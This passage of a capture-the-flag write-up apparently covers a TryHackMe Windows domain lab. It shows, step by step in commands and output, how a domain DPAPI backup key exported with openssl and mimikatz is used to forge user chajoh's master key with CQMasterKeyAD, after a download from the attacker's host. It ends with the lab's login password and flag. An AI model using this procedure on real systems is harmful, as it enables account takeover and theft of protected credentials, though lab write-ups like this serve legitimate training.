+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Fax Recipient.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Mail Recipient.MAPIMail
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\OneDrive.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\Magnify.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\Narrator.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\On-Screen Keyboard.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessories\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Internet Explorer.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Administrative Tools.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Command Prompt.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\computer.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Control Panel.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\File Explorer.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Run.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Themes\TranscodedWallpaper
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Themes\CachedFiles\CachedImage_2830_2064_POS4.jpg
+
+description:          Private Key
+ mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa
+```
+```text
+┌──(kali㉿kali)-[~/ra]
+└─$ cp ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx DMK.pfx
+```
+```text
+┌──(kali㉿kali)-[~/ra]
+└─$ openssl pkcs12 -in DMK.pfx -out temp.pem -nodes
+Enter Import Password: mimikatz.exe
+```
+```text
+┌──(kali㉿kali)-[~/ra]
+└─$ openssl pkcs12 -export -out DMK2.pfx -in temp.pem
+Enter Export Password:
+Verifying - Enter Export Password: cqure
+
+PS C:\Temp> Invoke-WebRequest http://10.10.103.96:1234/DMK2.pfx -o DMK2.pfx
+PS C:\Temp> ls
+ls
+
+    Directory: C:\Temp
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         9/16/2020  11:55 AM                OpenVPN                                                              
+-a----          1/6/2023   8:09 AM         219648 CQDPAPIBlobSearcher.exe                                              
+-a----          1/6/2023   8:09 AM          62464 CQMasterKeyAD.exe                                                    
+-a----          1/6/2023   8:07 AM           2554 DMK.pfx                                                              
+-a----          1/6/2023   8:24 AM           2499 DMK2.pfx                                                             
+-a----          1/6/2023   7:05 AM           6656 ivpn.exe                                                             
+-a----          1/6/2023   7:11 AM        1291016 mimikatz.exe                                                         
+-a----          1/6/2023   8:10 AM            801 resultsfile_20230106_081040.txt  
+
+./CQMasterKeyAD.exe /file "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" /pfx DMK2.pfx /newhash 4c05b64dec614df2b522c401bb8d8994
+
+d5a1ee32-7b1b-446f-be7f-ae0c5302be9c
+
+./CQMasterKeyAD.exe /file "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\d5a1ee32-7b1b-446f-be7f-ae0c5302be9c" /pfx DMK2.pfx /newhash 4c05b64dec614df2b522c401bb8d8994
+
+PS C:\Temp> ./CQMasterKeyAD.exe /file "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" /pfx DMK2.pfx /newhash 4c05b64dec614df2b522c401bb8d8994
+./CQMasterKeyAD.exe /file "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" /pfx DMK2.pfx /newhash 4c05b64dec614df2b522c401bb8d8994
+New masterkey file successfully written to: c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified
+Now swap the old masterkey file with the new one and set the system and hidden attributes, see example:
+attrib "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H
+
+Now we need to rename the existing MasterKey file `a773eede-71b6-4d66-b4b8-437e01749caa` in `C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\` to something else and rename our newly created MasterKey `a773eede-71b6-4d66-b4b8-437e01749caa.admodified` to `a773eede-71b6-4d66-b4b8-437e01749caa`
+
+Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa.another"
+
+PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa.another"
+
+PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> dir -for
+dir -for
+
+    Directory: C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          1/7/2023   6:01 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa.admodified                      
+-a-hs-         9/12/2020   4:13 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa.another                         
+-a-hs-         9/11/2020  11:42 AM            908 BK-WINDCORP                                                          
+-a-hs-         9/11/2020  11:42 AM             24 Preferred                                                            
+
+Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa"
+
+PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa"
+Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa"
+PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> dir -for
+dir -for
+
+    Directory: C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          1/7/2023   6:01 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa                                 
+-a-hs-         9/12/2020   4:13 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa.another                         
+-a-hs-         9/11/2020  11:42 AM            908 BK-WINDCORP                                                          
+-a-hs-         9/11/2020  11:42 AM             24 Preferred  
+
+Lastly, we need to run this command to make sure the new MasterKey is set with the correct attributes:
+
+attrib "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H
+
+Thanks Mr.Tom and (use Rdesktop in windows) to login
+
+computer: machine.ip
+Username: windcorp\chajoh
+Password: hackP@ssw0rd
+
+then login (need to download ovpn from tryhackme and connect it :) )
+
+THM{a77538464954d29a64c607f2318d930ccf4da5cccb308c7334c43fef9c94984448cf732f6de227cbfae9172ee2654e56704568ada698fb241c52148d338a3245}
+
+Was really fun!!
+
+:)
+```
+![[Pasted image 20230103230422.png]]
+![[Pasted image 20230103235641.png]]
+![[Pasted image 20230106225619.png]]
+![[Pasted image 20230107091114.png]]
+
+## Notes / Lessons Learned
+[[Set]]
+
